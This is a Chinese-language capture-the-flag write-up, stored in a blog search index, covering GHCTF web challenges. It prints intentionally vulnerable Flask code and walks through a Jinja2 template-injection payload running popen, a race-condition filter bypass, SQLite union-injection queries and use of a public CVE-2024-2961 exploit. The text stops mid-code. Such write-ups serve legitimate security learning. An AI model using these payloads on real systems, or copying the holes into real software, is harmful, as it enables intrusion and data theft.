<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>GHCTF-web.misc-wp</title>
    <link href="/blogs/uncategorized/GHCTF-web-misc-wp/"/>
    <url>/blogs/uncategorized/GHCTF-web-misc-wp/</url>
    
    <content type="html"><![CDATA[<p><a href="#1">upload?SSTI!</a><br><a href="#2">(&gt;﹏&lt;)</a><br><a href="#3">SQL???</a><br><a href="#4">ez_readfile</a><br><a href="#5">myleak</a></p><h2 id="upload-SSTI"><a href="#upload-SSTI" class="headerlink" title="upload?SSTI!"></a>upload?SSTI!</h2><p><span id="1"></span></p><details><summary>源码</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, request, jsonify,render_template_string,send_from_directory, abort,redirect<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> secure_filename<br><br>app = Flask(__name__)<br><br><span class="hljs-comment"># 配置信息</span><br>UPLOAD_FOLDER = <span class="hljs-string">&#x27;static/uploads&#x27;</span>  <span class="hljs-comment"># 上传文件保存目录</span><br>ALLOWED_EXTENSIONS = &#123;<span class="hljs-string">&#x27;txt&#x27;</span>, <span class="hljs-string">&#x27;log&#x27;</span>, <span class="hljs-string">&#x27;text&#x27;</span>,<span class="hljs-string">&#x27;md&#x27;</span>,<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>&#125;<br>MAX_CONTENT_LENGTH = <span class="hljs-number">16</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>  <span class="hljs-comment"># 限制上传大小为 16MB</span><br><br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>] = UPLOAD_FOLDER<br>app.config[<span class="hljs-string">&#x27;MAX_CONTENT_LENGTH&#x27;</span>] = MAX_CONTENT_LENGTH<br><br><span class="hljs-comment"># 创建上传目录（如果不存在）</span><br>os.makedirs(UPLOAD_FOLDER, exist_ok=<span class="hljs-literal">True</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">is_safe_path</span>(<span class="hljs-params">basedir, path</span>):<br>    <span class="hljs-keyword">return</span> os.path.commonpath([basedir,path])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">contains_dangerous_keywords</span>(<span class="hljs-params">file_path</span>):<br>    dangerous_keywords = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__globals__&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_content = <span class="hljs-built_in">str</span>(f.read())<br><br><br>        <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> dangerous_keywords:<br>            <span class="hljs-keyword">if</span> keyword <span class="hljs-keyword">in</span> file_content:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 找到危险关键字，返回 True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># 文件内容中没有危险关键字</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;.&#x27;</span> <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">and</span> \<br>        filename.rsplit(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>].lower() <span class="hljs-keyword">in</span> ALLOWED_EXTENSIONS<br><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-comment"># 检查是否有文件被上传</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;未上传文件&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br><br>        <span class="hljs-comment"># 检查是否选择了文件</span><br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;请选择文件&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-comment"># 验证文件名和扩展名</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> allowed_file(file.filename):<br>            <span class="hljs-comment"># 安全处理文件名</span><br>            filename = secure_filename(file.filename)<br>            <span class="hljs-comment"># 保存文件</span><br>            save_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename)<br>            file.save(save_path)<br><br><br><br>            <span class="hljs-comment"># 返回文件路径（绝对路径）</span><br>            <span class="hljs-keyword">return</span> jsonify(&#123;<br>                <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;File uploaded successfully&quot;</span>,<br>                <span class="hljs-string">&quot;path&quot;</span>: os.path.abspath(save_path)<br>            &#125;), <span class="hljs-number">200</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;文件类型错误&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>    <span class="hljs-comment"># GET 请求显示上传表单（可选）</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;!doctype html&gt;</span><br><span class="hljs-string">    &lt;title&gt;Upload File&lt;/title&gt;</span><br><span class="hljs-string">    &lt;h1&gt;Upload File&lt;/h1&gt;</span><br><span class="hljs-string">    &lt;form method=post enctype=multipart/form-data&gt;</span><br><span class="hljs-string">      &lt;input type=file name=file&gt;</span><br><span class="hljs-string">      &lt;input type=submit value=Upload&gt;</span><br><span class="hljs-string">    &lt;/form&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/file/&lt;path:filename&gt;&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_file</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-comment"># 1. 过滤文件名</span><br>        safe_filename = secure_filename(filename)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> safe_filename:<br>            abort(<span class="hljs-number">400</span>, description=<span class="hljs-string">&quot;无效文件名&quot;</span>)<br><br>        <span class="hljs-comment"># 2. 构造完整路径</span><br>        file_path = os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], safe_filename)<br><br>        <span class="hljs-comment"># 3. 路径安全检查</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> is_safe_path(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], file_path):<br>            abort(<span class="hljs-number">403</span>, description=<span class="hljs-string">&quot;禁止访问的路径&quot;</span>)<br><br>        <span class="hljs-comment"># 4. 检查文件是否存在</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.isfile(file_path):<br>            abort(<span class="hljs-number">404</span>, description=<span class="hljs-string">&quot;文件不存在&quot;</span>)<br><br>        suffix=os.path.splitext(filename)[<span class="hljs-number">1</span>]<br>        <span class="hljs-built_in">print</span>(suffix)<br>        <span class="hljs-keyword">if</span> suffix==<span class="hljs-string">&quot;.jpg&quot;</span> <span class="hljs-keyword">or</span> suffix==<span class="hljs-string">&quot;.png&quot;</span> <span class="hljs-keyword">or</span> suffix==<span class="hljs-string">&quot;.gif&quot;</span>:<br>            <span class="hljs-keyword">return</span> send_from_directory(<span class="hljs-string">&quot;static/uploads/&quot;</span>,filename,mimetype=<span class="hljs-string">&#x27;image/jpeg&#x27;</span>)<br><br>        <span class="hljs-keyword">if</span> contains_dangerous_keywords(file_path):<br>            <span class="hljs-comment"># 删除不安全的文件</span><br>            os.remove(file_path)<br>            <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Waf!!!!&quot;</span>&#125;), <span class="hljs-number">400</span><br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            file_data = f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        tmp_str = <span class="hljs-string">&quot;&quot;&quot;&lt;!DOCTYPE html&gt;</span><br><span class="hljs-string">        &lt;html lang=&quot;zh&quot;&gt;</span><br><span class="hljs-string">        &lt;head&gt;</span><br><span class="hljs-string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="hljs-string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="hljs-string">            &lt;title&gt;查看文件内容&lt;/title&gt;</span><br><span class="hljs-string">        &lt;/head&gt;</span><br><span class="hljs-string">        &lt;body&gt;</span><br><span class="hljs-string">            &lt;h1&gt;文件内容：&#123;name&#125;&lt;/h1&gt;  &lt;!-- 显示文件名 --&gt;</span><br><span class="hljs-string">            &lt;pre&gt;&#123;data&#125;&lt;/pre&gt;  &lt;!-- 显示文件内容 --&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">            &lt;footer&gt;</span><br><span class="hljs-string">                &lt;p&gt;&amp;copy; 2025 文件查看器&lt;/p&gt;</span><br><span class="hljs-string">            &lt;/footer&gt;</span><br><span class="hljs-string">        &lt;/body&gt;</span><br><span class="hljs-string">        &lt;/html&gt;</span><br><span class="hljs-string">        &quot;&quot;&quot;</span>.<span class="hljs-built_in">format</span>(name=safe_filename, data=file_data)<br><br>        <span class="hljs-keyword">return</span> render_template_string(tmp_str)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        app.logger.error(<span class="hljs-string">f&quot;文件查看失败: <span class="hljs-subst">&#123;<span class="hljs-built_in">str</span>(e)&#125;</span>&quot;</span>)<br>        abort(<span class="hljs-number">500</span>, description=<span class="hljs-string">&quot;文件查看失败:&#123;&#125; &quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>(e)) + request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>))<br><br><br><span class="hljs-comment"># 错误处理（可选）</span><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">404</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">not_found</span>(<span class="hljs-params">error</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: error.description&#125;, <span class="hljs-number">404</span><br><br><br><span class="hljs-meta">@app.errorhandler(<span class="hljs-params"><span class="hljs-number">403</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">forbidden</span>(<span class="hljs-params">error</span>):<br>    <span class="hljs-keyword">return</span> &#123;<span class="hljs-string">&quot;error&quot;</span>: error.description&#125;, <span class="hljs-number">403</span><br></code></pre></td></tr></table></figure></details><p>注入点在<code>file</code>路由下的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">return</span> render_template_string(tmp_str)<br></code></pre></td></tr></table></figure><p>其中<code>name</code>和<code>data</code>两个变量可控, 其中对文件名做了严格的过滤,<code>secure_filename</code>函数用了好几遍, 文件名注入应该不太可行.<br>对于文件内容只用了这样一个函数来过滤</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">contains_dangerous_keywords</span>(<span class="hljs-params">file_path</span>):<br>    dangerous_keywords = [<span class="hljs-string">&#x27;_&#x27;</span>, <span class="hljs-string">&#x27;os&#x27;</span>, <span class="hljs-string">&#x27;subclasses&#x27;</span>, <span class="hljs-string">&#x27;__builtins__&#x27;</span>, <span class="hljs-string">&#x27;__globals__&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,]<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        file_content = <span class="hljs-built_in">str</span>(f.read())<br><br><br>        <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> dangerous_keywords:<br>            <span class="hljs-keyword">if</span> keyword <span class="hljs-keyword">in</span> file_content:<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span>  <span class="hljs-comment"># 找到危险关键字，返回 True</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span>  <span class="hljs-comment"># 文件内容中没有危险关键字</span><br></code></pre></td></tr></table></figure><p>很容易用十六进制编码绕过, 比如<code>c[&#39;\x5f\x5finit\x5f\x5f&#39;]</code>相当于<code>c.__init__</code><br>但是这里想直接用undefind类会报错, 本地运行不会报错, 可能是版本的原因.<br>可以改用<code>self.__init__</code>, self指向<code>TemplateReference</code></p><p>也可以使用request绕过, payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">&#123;&#123;<span class="hljs-variable language_">self</span>[request.args.get(<span class="hljs-string">&#x27;1&#x27;</span>)][request.args.get(<span class="hljs-string">&#x27;2&#x27;</span>)][request.args.get(<span class="hljs-string">&#x27;3&#x27;</span>)][request.args.get(<span class="hljs-string">&#x27;4&#x27;</span>)](<span class="hljs-string">&#x27;o&#x27;</span>+<span class="hljs-string">&#x27;s&#x27;</span>).popen(<span class="hljs-string">&#x27;ls /&#x27;</span>).read()&#125;&#125;<br></code></pre></td></tr></table></figure><p>写wp的时候发现代码中对文件内容审查的逻辑存在<code>条件竞争</code>的漏洞</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> contains_dangerous_keywords(file_path):<br>    <span class="hljs-comment"># 删除不安全的文件</span><br>    os.remove(file_path)<br>    <span class="hljs-keyword">return</span> jsonify(&#123;<span class="hljs-string">&quot;error&quot;</span>: <span class="hljs-string">&quot;Waf!!!!&quot;</span>&#125;), <span class="hljs-number">400</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file_path, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    file_data = f.read().decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br></code></pre></td></tr></table></figure><p>只需要在<code>contains_dangerous_keywords</code>审查文件内容通过后的瞬间写入文件. 后续再读出文件内容已经变成我们的模板注入内容,所以这题waf再严格也能够通过</p><h2 id="﹏"><a href="#﹏" class="headerlink" title="(&gt;﹏&lt;)"></a>(&gt;﹏&lt;)</h2><p><span id="2"></span><br>很简单的XXE, 读取&#x2F;flag即可,<br>奇怪的是前几次拿到的flag一直提交不上去,还以为是假的,白白做了半天…</p><p>( ??什么? XXE变成了RCE? 那真把&#x2F;flag变成假的也可以做了…</p><h2 id="SQL"><a href="#SQL" class="headerlink" title="SQL???"></a>SQL???</h2><p><span id="3"></span></p><p><strong>解题关键：</strong><br><strong>非mysql的sql注入，用的数据库是sqlite</strong></p><p>一开始一直按照mysql的方式注入，发现输入<code>&#39;&#39;,&#39;&quot;</code>返回hacker，想要select database()却返回500,还以为是database()、if、sys.schema_table_statistics_with_buffer等都被过滤了…</p><p>直到测试<code>--database()</code>时发现, 竟然正常返回了(<code>--</code>是注释) 说明并没有过滤database(), 也就是说500是程序自动抛出的. 说明database()不符合语法. 由此可知, 采用的数据库并非mysql.<br>测试发现是sqlite:<br><strong>payload</strong><br><code>1 union select 1,1,1,1,tbl_name from sqlite_master</code> &#x3D;&gt; 表名是flag</p><p><code>1 union select 1,1,1,1,sql from sqlite_master</code><br>&#x3D;&gt; 返回曾执行的sql语句记录 <code>CREATE TABLE &quot;flag&quot; ( &quot;flag&quot; TEXT)</code><br>&#x3D;&gt; 列名是flag</p><p><code>1 union select 1,1,1,1,flag from flag</code></p><h2 id="ez-readfile"><a href="#ez-readfile" class="headerlink" title="ez_readfile"></a>ez_readfile</h2><p><span id="4"></span><br>md5碰撞后,任意文件读取,但是把文件都读了个遍也没找到<code>flag</code>,比如<br><code>/proc/self/cmdline</code>、<code>/etc/password/environment</code>、<code>/proc/self/environ</code></p><p>然后搜了下<code>file_get_contents site:xz.aliyun.com</code><br>找到了<a href="https://xz.aliyun.com/news/8220">学习文章</a></p><p>发现是<code>CVE-2024-2961</code>,iconv转化时缓冲区溢出,具体原理看不懂…, 在github上找到作者的exp。<br>远程测试和本地测试发现都不能直接用, 原因分析了半天发现<code>php://filter</code>进行base64加密的时候会吞掉最后的短块，而不会正常补齐，因此加密之后总没有<code>=</code>。因此把测试伪协议的随机生成的50字节改成51字节即可。</p><h2 id="myleak"><a href="#myleak" class="headerlink" title="myleak"></a>myleak</h2><details><summary>源码:</summary><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, render_template, request, redirect, url_for, session, send_from_directory<br><span class="hljs-keyword">from</span> flask_session <span class="hljs-keyword">import</span> Session<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> hashlib<br><br>app = Flask(__name__)<br>app.secret_key = hashlib.sha256(<span class="hljs-built_in">str</span>(time.time()).encode()).hexdigest()<br>app.config[<span class="hljs-string">&#x27;SESSION_TYPE&#x27;</span>] = <span class="hljs-string">&#x27;filesystem&#x27;</span><br>app.config[<span class="hljs-string">&#x27;SESSION_FILE_DIR&#x27;</span>] = <span class="hljs-string">&#x27;./flask_session&#x27;</span><br>Session(app)<br><br><span class="hljs-comment"># 用户配置</span><br>CORRECT_PASSWORD = <span class="hljs-string">&#x27;0123456789012345&#x27;</span><br>VERIFICATION_CODE = <span class="hljs-string">&#x27;this_is_my_strong!-verifid_~code&#x27;</span> <span class="hljs-comment"># 验证码</span><br>ADJECTIVES = [<span class="hljs-string">&#x27;Happy&#x27;</span>, <span class="hljs-string">&#x27;Clever&#x27;</span>, <span class="hljs-string">&#x27;Swift&#x27;</span>, <span class="hljs-string">&#x27;Brave&#x27;</span>, <span class="hljs-string">&#x27;Gentle&#x27;</span>, <span class="hljs-string">&#x27;Honest&#x27;</span>, <span class="hljs-string">&#x27;Lucky&#x27;</span>, <span class="hljs-string">&#x27;Wise&#x27;</span>]<br>NOUNS = [<span class="hljs-string">&#x27;Panda&#x27;</span>, <span class="hljs-string">&#x27;Tiger&#x27;</span>, <span class="hljs-string">&#x27;Eagle&#x27;</span>, <span class="hljs-string">&#x27;Dolphin&#x27;</span>, <span class="hljs-string">&#x27;Phoenix&#x27;</span>, <span class="hljs-string">&#x27;Wolf&#x27;</span>, <span class="hljs-string">&#x27;Lion&#x27;</span>, <span class="hljs-string">&#x27;Dragon&#x27;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_random_username</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;生成随机用户名 格式：形容词_名词_数字&quot;&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;random.choice(ADJECTIVES)&#125;</span>_<span class="hljs-subst">&#123;random.choice(NOUNS)&#125;</span>_<span class="hljs-subst">&#123;random.randint(<span class="hljs-number">100</span>, <span class="hljs-number">999</span>)&#125;</span>&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">home</span>():<br>    <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/login&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        PASSWORD = request.form.get(<span class="hljs-string">&#x27;password&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(PASSWORD) != <span class="hljs-built_in">len</span>(CORRECT_PASSWORD):<br>            <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, error=<span class="hljs-string">&#x27;密码长度错误&#x27;</span>)<br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(PASSWORD)):<br>            <span class="hljs-keyword">if</span> PASSWORD[i] != CORRECT_PASSWORD[i]:<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>, error=<span class="hljs-string">&#x27;密码错误&#x27;</span>)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>        session[<span class="hljs-string">&#x27;logged_in&#x27;</span>] = <span class="hljs-literal">True</span><br>        session[<span class="hljs-string">&#x27;username&#x27;</span>] = generate_random_username()<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;index&#x27;</span>))<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/index&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> session.get(<span class="hljs-string">&#x27;logged_in&#x27;</span>):<br>        <span class="hljs-keyword">return</span> redirect(url_for(<span class="hljs-string">&#x27;login&#x27;</span>))<br>    <br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        user_code = request.form.get(<span class="hljs-string">&#x27;code&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">if</span> user_code == VERIFICATION_CODE:<br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;/flag&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                    flag = f.read().strip()<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, flag=flag)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;读取flag文件失败: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br>                <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, error=<span class="hljs-string">&#x27;系统错误，请联系系统管理员&#x27;</span>)<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>, error=<span class="hljs-string">&#x27;验证码错误，请重新输入&#x27;</span>)<br>    <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span 